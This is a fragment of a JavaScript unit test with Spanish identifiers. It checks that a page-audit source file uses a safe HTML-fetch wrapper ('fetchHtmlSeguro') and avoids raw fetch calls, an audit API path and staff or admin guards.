    )
    expect(fuente).not.toContain("/api/audit")
    expect(fuente).not.toContain("globalThis.fetch")
    expect(fuente).not.toMatch(/\bfetch\s*\(/)
    expect(fuente).not.toMatch(/requireStaff|requireAdmin/)
    expect(fuente).toContain("fetchHtmlSeguro")
    expect(fuente).toContain("auditarPagina")
  })
})
